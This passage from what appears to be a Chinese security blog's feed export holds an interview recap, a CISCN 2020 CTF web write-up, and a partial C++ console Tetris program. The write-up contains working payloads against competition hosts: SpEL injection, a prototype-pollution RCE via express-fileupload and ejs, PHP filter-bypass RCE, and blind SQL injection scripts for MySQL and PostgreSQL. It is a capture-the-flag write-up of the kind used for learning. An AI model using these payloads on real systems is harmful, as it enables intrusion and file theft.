<li>学过其他一开始不擅长的东西么 (我说学过一点 pwn, 不过之后确实问的也不是很难的 pwn 技巧)</li>
<li>ROP 怎么利用</li>
<li>怎么防止栈溢出</li>
<li>ASLR 开启怎么 pwn</li>
<li>你有什么要问的</li>
</ol>
<h3 id="二面-3"><a href="#二面-3" class="headerlink" title="二面"></a>二面</h3><p>主要问开发项目相关问题  </p>
<h3 id="三面-2"><a href="#三面-2" class="headerlink" title="三面"></a>三面</h3><p>交叉面, 问一些基础问题, 比如 tcp 握手, http 协议, 跨域啥的  </p>
<hr>
<p>字节相对来说偏基础一些, 问一些考察基础的问题. 而且一面面试官听内推同学说是搞安全开发的 orz, 所以问了很多开发的内容.<br>腾讯相对偏实践一些, 问一些需要经验的内容, 当也都有专业相关内容的考察, 比如说 csrf, fastjson rce 原理等.<br>阿里其实已经到二面了, 但是懒得写了 orz, 特点是会问对着项目相关经历问一些比较深的内容. 比如我写了 rasp, 就会问 rasp 的实现原理和优缺点等等.<br>可能在之后有机会不定时更新.  </p>
<p>当然这些都无法代表所有的面试官, 最多只能代表相关组面试喜欢问的内容, 仅供参考.  </p>
<p>Update at 2020-04-24:<br>没想到竟然能凑齐字节, 阿里, 腾讯的 Offer, 最后选择了字节, 原因有很多, 最主要原因还是转正把, 拒掉云鼎的原因也有很多, 比较复杂, 不太好说. 希望在一年后回来看现在的自己, 做出的是正确的选择吧.  </p>
]]></content>
      <tags>
        <tag>interview</tag>
      </tags>
  </entry>
  <entry>
    <title>2020 CISCN 华东北赛区 WEB Writeup</title>
    <url>/2020/09/19/2020-CISCN-%E5%8D%8E%E4%B8%9C%E5%8C%97%E8%B5%9B%E5%8C%BA-WEB-Writeup/</url>
    <content><![CDATA[<p>一共 6 题 WEB, 我一个人拿了 4 个一血, 还有一题全场 0 解. 然而没有 pwn 爷爷依旧被吊打, 而且题目质量是真的差, 明年再打国赛我是傻逼.</p>
<a id="more"></a>

<h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><p><a href="http://172.20.29.103:80/flag.php" target="_blank" rel="noopener">http://172.20.29.103:80/flag.php</a> 直接返回 flag. 你们赛宁没有题目复审的么?</p>
<h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><p>随便 fuzz 根据报错得知是 sepl，构造 payload T%00 绕过过滤直接读文件即可, fix 的时候给看源码, 发现出题人正则写成了 <code>&quot;T\\\\x00&quot;</code>, 应该是想到了要过滤的, 你们赛宁没有题目复审的么? x2</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: 172.20.29.104:8080</span><br><span class="line">Content-Length: 91</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Origin: http:&#x2F;&#x2F;172.20.29.104:8080</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">DNT: 1</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;85.0.4183.83 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Referer: http:&#x2F;&#x2F;172.20.29.104:8080&#x2F;</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9,zh-TW;q&#x3D;0.8,en;q&#x3D;0.7</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">expr&#x3D;T%00(java.nio.file.Files).readAllLines(T%00(java.nio.file.Paths).get%00(&#39;&#x2F;flag.txt&#39;))</span><br></pre></td></tr></table></figure>

<h2 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h2><p>扫出来只有 static 文件夹，根据 server header 得知服务器用的 nginx，同时存在配置错误，可以目录穿越读取文件.<br><a href="http://172.20.29.107/static../app.js" target="_blank" rel="noopener">http://172.20.29.107/static../app.js</a>, 在源码中发现使用了 <code>express-fileupload</code> ，存在原型链污染，可以结合 ejs 利用，直接 rce</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;4_pATh_y0u_CaNN07_Gu3ss HTTP&#x2F;1.1</span><br><span class="line">Host: 172.20.29.107</span><br><span class="line">User-Agent: curl&#x2F;7.64.1</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Content-Length: 263</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;------------------------a4826c30ee705335</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">--------------------------a4826c30ee705335</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;__proto__.outputFunctionName&quot;</span><br><span class="line"></span><br><span class="line">_tmp1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;cat &#x2F;flag.txt &gt; flag.txt&#39;);var __tmp2</span><br><span class="line">--------------------------a4826c30ee705335--</span><br></pre></td></tr></table></figure>
<p>然后读取 <a href="http://172.20.29.107/static../flag.txt" target="_blank" rel="noopener">http://172.20.29.107/static../flag.txt</a> 即可</p>
<h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p>robots.txt 得到 hint.txt, 可以得到 sql 语句， 根据其特性，用 \ 来注入， 之后绕 waf 注入出密码，登陆后得到 c2ZtdHFs.php, </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">sess = requests.session()</span><br><span class="line">url = <span class="string">'http://172.20.29.102/'</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">'0x5e'</span></span><br><span class="line">table = string.ascii_letters + <span class="string">'_'</span> + string.digits</span><br><span class="line">table = [ord(i) <span class="keyword">for</span> i <span class="keyword">in</span> table]</span><br><span class="line">raw_flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> table:</span><br><span class="line">        t = flag + hex(i)[<span class="number">2</span>:].rjust(<span class="number">0</span>, <span class="string">'2'</span>)</span><br><span class="line">        <span class="comment">#print(t)</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'username'</span>: <span class="string">'\\'</span>,</span><br><span class="line">            <span class="string">'password'</span>: <span class="string">'||password/**/regexp/**/binary/**/%s#'</span> % t</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        res = sess.post(url, data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'success'</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            <span class="comment">#print(chr(i))</span></span><br><span class="line">            flag += hex(i)[<span class="number">2</span>:].rjust(<span class="number">0</span>, <span class="string">'2'</span>)</span><br><span class="line">            print(flag)</span><br><span class="line">            raw_flag += chr(i)</span><br><span class="line">            print(raw_flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> i == table[<span class="number">-1</span>]:</span><br><span class="line">        print(<span class="string">'WARNGIN'</span>)</span><br></pre></td></tr></table></figure>

<p>用 &amp; 绕一下过滤，即可 rce</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F;c2ZtdHFs.php?gzmtu&#x3D;(sysuem%26sysvem)((currenu%26currenv)((weucmmhecders%26oevennheeders)())) HTTP&#x2F;1.1</span><br><span class="line">A: cat &#x2F;flag.txt</span><br><span class="line">Host: 172.20.29.102</span><br></pre></td></tr></table></figure>

<h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2><p>pgsql 注入，双写绕过 select，之后熟悉下语法写脚本注入后登陆就有 flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">sess = requests.session()</span><br><span class="line">url = <span class="string">'http://172.20.29.105/index.php'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">to_chr</span><span class="params">(inp)</span>:</span></span><br><span class="line">    ret = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> inp:</span><br><span class="line">        ret += <span class="string">f"||chr(<span class="subst">&#123;ord(i)&#125;</span>)"</span></span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line">table = string.ascii_letters + string.digits + <span class="string">'_.-'</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">table = string.printable</span><br><span class="line">table = [ord(i) <span class="keyword">for</span> i <span class="keyword">in</span> table]</span><br><span class="line">query = <span class="string">'selselectect/**/password/**/from/**/users/**/limit/**/1/**/OFFSET/**/0'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> table:</span><br><span class="line">        t = to_chr(flag) + <span class="string">f'||chr(<span class="subst">&#123;i&#125;</span>)'</span></span><br><span class="line">        t = t[<span class="number">2</span>:]</span><br><span class="line"></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'username'</span>: <span class="string">'admin'</span>,</span><br><span class="line">            <span class="string">'password'</span>: <span class="string">"admin'/**/or/**/'1'/**/and/**/cast(position(%s/**/in/**/(%s))/**/as/**/bool)/**/and/**/'1"</span> % (t, query)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        res = sess.post(<span class="string">'http://172.20.29.105/index.php'</span>, data=data)</span><br><span class="line">        <span class="comment">#print(res.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'hacker'</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            print(<span class="string">'hacker'</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Too Young Too Simple'</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            flag += chr(i)</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> i == table[<span class="number">-1</span>]:</span><br><span class="line">            print(<span class="string">'WARNNING'</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> table:</span><br><span class="line">                    t = <span class="string">f'||chr(<span class="subst">&#123;i&#125;</span>)'</span> + to_chr(flag)</span><br><span class="line">                    t = t[<span class="number">2</span>:]</span><br><span class="line">                    data = &#123;</span><br><span class="line">                        <span class="string">'username'</span>: <span class="string">'admin'</span>,</span><br><span class="line">                        <span class="string">'password'</span>: <span class="string">"admin'/**/or/**/'1'/**/and/**/cast(position(%s/**/in/**/(%s))/**/as/**/bool)/**/and/**/'1"</span> % (</span><br><span class="line">                        t, query)</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    res = sess.post(<span class="string">'http://172.20.29.105/index.php'</span>, data=data)</span><br><span class="line">                    <span class="comment"># print(res.text)</span></span><br><span class="line">                    <span class="keyword">if</span> <span class="string">'hacker'</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                        print(<span class="string">'hacker'</span>)</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> <span class="string">'Too Young Too Simple'</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                        flag = chr(i) + flag</span><br><span class="line">                        print(flag)</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                    <span class="keyword">if</span> i == table[<span class="number">-1</span>]:</span><br><span class="line">                        print(<span class="string">'WARNNING'</span>)</span><br></pre></td></tr></table></figure>

<h2 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h2><p>这题目能把人气笑, 全场 0 解, 最后发现放了个 ssrf.php, 无任何提示, 就硬猜, 而且里面的过滤写成了 <code>/file:|http://|php/</code>, 这是过滤了个锤子, 你们赛宁没有题目复审的么? x3</p>
]]></content>
      <tags>
        <tag>web</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>C++ 控制台小游戏俄罗斯方块</title>
    <url>/2018/01/26/C++%20%E6%8E%A7%E5%88%B6%E5%8F%B0%E5%B0%8F%E6%B8%B8%E6%88%8F%E4%BF%84%E7%BD%97%E6%96%AF%E6%96%B9%E5%9D%97/</url>
    <content><![CDATA[<p>同样是寒假之前就开的坑, 在期末考试之前就写了一大半, 今天把坑给填上了, 效果还不错. 多线程操控变量真的是坑巨多啊, 干脆不用算了.  </p>
<a id="more"></a>

<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;random&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ctime&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WIDTH 15 <span class="comment">//在控制台中一个单元格的宽度为2, 高度为1</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HIGHT 30</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KEY_DOWN(VK_NONAME) ((GetAsyncKeyState(VK_NONAME) &amp; 0x8000) ? 1:0) </span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LEFT 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RIGHT 2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DOWN 3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ROTATE 4</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">HideCursor</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	CONSOLE_CURSOR_INFO cursor_info = &#123; <span class="number">1</span>, <span class="number">0</span> &#125;;</span><br><span class="line">	SetConsoleCursorInfo(GetStdHandle(STD_OUTPUT_HANDLE), &amp;cursor_info);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">point</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="keyword">int</span> x = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> y = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	point() :x(<span class="number">0</span>), y(<span class="number">0</span>) &#123;&#125;;</span><br><span class="line">	point(<span class="keyword">int</span> _x, <span class="keyword">int</span> _y) :x(_x), y(_y) &#123;&#125;;</span><br><span class="line"></span><br><span class="line">	point <span class="keyword">operator</span>- (point input)</span><br><span class="line">	&#123;</span><br><span class="line">		input.x -= x;</span><br><span class="line">		input.y -= y;</span><br><span class="line">		<span class="keyword">return</span> input;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	point <span class="keyword">operator</span>+ (point input)</span><br><span class="line">	&#123;</span><br><span class="line">		input.x += x;</span><br><span class="line">		input.y += y;</span><br><span class="line">		<span class="keyword">return</span> input;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">myScreen</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">string</span> dot = <span class="string">"■"</span>;</span><br><span class="line">	<span class="built_in">string</span> blank = <span class="string">"  "</span>;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y ,<span class="built_in">string</span> input)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		COORD coord; <span class="comment">// coordinates  </span></span><br><span class="line">		coord.X = x * <span class="number">2</span>; coord.Y = y; <span class="comment">// X and Y coordinates  </span></span><br><span class="line">		SetConsoleCursorPosition(GetStdHandle(STD_OUTPUT_HANDLE), coord); <span class="comment">// moves to the coordinates</span></span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; input;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">printVector</span><span class="params">(<span class="built_in">vector</span>&lt;point&gt; &amp;temp, <span class="built_in">string</span> input)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; temp.size(); ++i)</span><br><span class="line">		&#123;</span><br><span class="line">			print(temp[i].x, temp[i].y, input);			</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">printFixedBlock</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; &amp;temp,<span class="keyword">int</span> currColor)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; WIDTH; ++i)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span> j = <span class="number">0</span>; j &lt; HIGHT; ++j)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span> (temp[i][j] != <span class="number">0</span>) </span><br><span class="line">				&#123;</span><br><span class="line">					SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), temp[i][j]); <span class="comment">//移动方块的同时保持颜色不变</span></span><br><span class="line">					print(i + <span class="number">1</span>, j + <span class="number">1</span>, dot);</span><br><span class="line">				&#125;</span><br><span class="line">				</span><br><span class="line">				<span class="keyword">if</span> (temp[i][j] == <span class="number">0</span>) print(i + <span class="number">1</span>, j + <span class="number">1</span>, blank);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), currColor); <span class="comment">//恢复成原来的颜色</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">myTetrisBlocks</span></span></span><br><span class="line"><span class="class">&#123;</span> <span class="comment">//S、Z、L、J、I、O、T</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	<span class="built_in">vector</span>&lt;point&gt; S1 = &#123; point(<span class="number">0</span>,<span class="number">0</span>),point(<span class="number">0</span>,<span class="number">1</span>),point(<span class="number">1</span>,<span class="number">0</span>),point(<span class="number">-1</span>,<span class="number">1</span>) &#125;;</span><br><span class="line">	<span class="built_in">vector</span>&lt;point&gt; S2 = &#123; point(<span class="number">0</span>,<span class="number">0</span>),point(<span class="number">0</span>,<span class="number">-1</span>),point(<span class="number">1</span>,<span class="number">0</span>),point(<span class="number">1</span>,<span class="number">1</span>) &#125;;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">vector</span>&lt;point&gt; Z1 = &#123; point(<span class="number">0</span>,<span class="number">0</span>),point(<span class="number">0</span>,<span class="number">-1</span>),point(<span class="number">-1</span>,<span class="number">0</span>),point(<span class="number">-1</span>,<span class="number">1</span>) &#125;;</span><br><span class="line">	<span class="built_in">vector</span>&lt;point&gt; Z2 = &#123; point(<span class="number">0</span>,<span class="number">0</span>),point(<span class="number">0</span>,<span class="number">1</span>),point(<span class="number">-1</span>,<span class="number">0</span>),point(<span class="number">1</span>,<span class="number">1</span>) &#125;;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">vector</span>&lt;point&gt; L1 = &#123; point(<span class="number">0</span>,<span class="number">0</span>),point(<span class="number">1</span>,<span class="number">0</span>),point(<span class="number">-1</span>,<span class="number">0</span>),point(<span class="number">-1</span>,<span class="number">-1</span>) &#125;;</span><br><span class="line">	<span class="built_in">vector</span>&lt;point&gt; L2 = &#123; point(<span class="number">0</span>,<span class="number">0</span>),point(<span class="number">0</span>,<span class="number">1</span>),point(<span class="number">1</span>,<span class="number">-1</span>),point(<span class="number">0</span>,<span class="number">-1</span>) &#125;;</span><br><span class="line">	<span class="built_in">vector</span>&lt;point&gt; L3 = &#123; point(<span class="number">0</span>,<span class="number">0</span>),point(<span class="number">1</span>,<span class="number">0</span>),point(<span class="number">-1</span>,<span class="number">0</span>),point(<span class="number">1</span>,<span class="number">1</span>) &#125;;</span><br><span class="line">	<span class="built_in">vector</span>&lt;point&gt; L4 = &#123; point(<span class="number">0</span>,<span class="number">0</span>),point(<span class="number">0</span>,<span class="number">1</span>),point(<span class="number">-1</span>,<span class="number">1</span>),point(<span class="number">0</span>,<span class="number">-1</span>) &#125;;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">vector</span>&lt;point&gt; J1 = &#123; point(<span class="number">0</span>,<span class="number">0</span>),point(<span class="number">1</span>,<span class="number">0</span>),point(<span class="number">-1</span>,<span class="number">0</span>),point(<span class="number">1</span>,<span class="number">-1</span>) &#125;;</span><br><span class="line">	<span class="built_in">vector</span>&lt;point&gt; J2 = &#123; point(<span class="number">0</span>,<span class="number">0</span>),point(<span class="number">0</span>,<span class="number">1</span>),point(<span class="number">1</span>,<span class="number">1</span>),point(<span class="number">0</span>,<span class="number">-1</span>) &#125;;</span><br><span class="line">	<span class="built_in">vector</span>&lt;point&gt; J3 = &#123; point(<span class="number">0</span>,<span class="number">0</span>),point(<span class="number">1</span>,<span class="number">0</span>),point(<span class="number">-1</span>,<span class="number">0</span>),point(<span class="number">-1</span>,<span class="number">1</span>) &#125;;</span><br><span class="line">	<span class="built_in">vector</span>&lt;point&gt; J4 = &#123; point(<span class="number">0</span>,<span class="number">0</span>),point(<span class="number">0</span>,<span class="number">1</span>),point(<span class="number">-1</span>,<span class="number">-1</span>),point(<span class="number">0</span>,<span class="number">-1</span>) &#125;;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">vector</span>&lt;point&gt; I1 = &#123; point(<span class="number">0</span>,<span class="number">0</span>),point(<span class="number">1</span>,<span class="number">0</span>),point(<span class="number">2</span>,<span class="number">0</span>),point(<span class="number">-1</span>,<span class="number">0</span>) &#125;;</span><br><span class="line">	<span class="built_in">vector</span>&lt;point&gt; I2 = &#123; point(<span class="number">0</span>,<span class="number">0</span>),point(<span class="number">0</span>,<span class="number">-1</span>),point(<span class="number">0</span>,<span class="number">1</span>),point(<span class="number">0</span>,<span class="number">2</span>) &#125;;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">vector</span>&lt;point&gt; O1 = &#123; point(<span class="number">0</span>,<span class="number">0</span>),point(<span class="number">1</span>,<span class="number">0</span>),point(<span class="number">1</span>,<span class="number">1</span>),point(<span class="number">0</span>,<span class="number">1</span>) &#125;;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">vector</span>&lt;point&gt; T1 = &#123; point(<span class="number">0</span>,<span class="number">0</span>),point(<span class="number">1</span>,<span class="number">0</span>),point(<span class="number">-1</span>,<span class="number">0</span>),point(<span class="number">0</span>,<span class="number">-1</span>) &#125;;</span><br><span class="line">	<span class="built_in">vector</span>&lt;point&gt; T2 = &#123; point(<span class="number">0</span>,<span class="number">0</span>),point(<span class="number">1</span>,<span class="number">0</span>),point(<span class="number">0</span>,<span class="number">1</span>),point(<span class="number">0</span>,<span class="number">-1</span>) &#125;;</span><br><span class="line">	<span class="built_in">vector</span>&lt;point&gt; T3 = &#123; point(<span class="number">0</span>,<span class="number">0</span>),point(<span class="number">1</span>,<span class="number">0</span>),point(<span class="number">-1</span>,<span class="number">0</span>),point(<span class="number">0</span>,<span class="number">1</span>) &#125;;</span><br><span class="line">	<span class="built_in">vector</span>&lt;point&gt; T4 = &#123; point(<span class="number">0</span>,<span class="number">0</span>),point(<span class="number">-1</span>,<span class="number">0</span>),point(<span class="number">0</span>,<span class="number">1</span>),point(<span class="number">0</span>,<span class="number">-1</span>) &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="comment">//========================================S</span></span><br><span class="line">	<span class="built_in">vector</span>&lt;point&gt; getS1(point center)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">vector</span>&lt;point&gt; temp;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; S1.size(); ++i)</span><br><span class="line">		&#123;</span><br><span class="line">			temp.emplace_back(S1[i] + center);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> temp;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">vector</span>&lt;point&gt; getS2(point center)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">vector</span>&lt;point&gt; temp;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; S2.size(); ++i)</span><br><span class="line">		&#123;</span><br><span class="line">			temp.emplace_back(S2[i] + center);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> temp;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//========================================Z</span></span><br><span class="line">	<span class="built_in">vector</span>&lt;point&gt; getZ1(point center)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">vector</span>&lt;point&gt; temp;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; Z1.size(); ++i)</span><br><span class="line">		&#123;</span><br><span class="line">			temp.emplace_back(Z1[i] + center);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> temp;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">vector</span>&lt;point&gt; getZ2(point center)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">vector</span>&lt;point&gt; temp;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; Z2.size(); ++i)</span><br><span class="line">		&#123;</span><br><span class="line">			temp.emplace_back(Z2[i] + center);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> temp;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//========================================L</span></span><br><span class="line">	<span class="built_in">vector</span>&lt;point&gt; getL1(point center)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">vector</span>&lt;point&gt; temp;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; L1.size(); ++i)</span><br><span class="line">		&#123;</span><br><span class="line">			temp.emplace_back(L1[i] + center);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> temp;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">vector</span>&lt;point&gt; getL2(point center)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">vector</span>&lt;point&gt; temp;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; L2.size(); ++i)</span><br><span class="line">		&#123;</span><br><span class="line">			temp.emplace_back(L2[i] + center);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> temp;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">vector</span>&lt;point&gt; getL3(point center)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">vector</span>&lt;point&gt; temp;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; L3.size(); ++i)</span><br><span class="line">		&#123;</span><br><span class="line">			temp.emplace_back(L3[i] + center);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> temp;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">vector</span>&lt;point&gt; getL4(point center)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">vector</span>&lt;point&gt; temp;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; L4.size(); ++i)</span><br><span class="line">		&#123;</span><br><span class="line">			temp.emplace_back(L4[i] + center);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> temp;</span><br><span class="line">	&#125;</span><br><span class="line">	<span 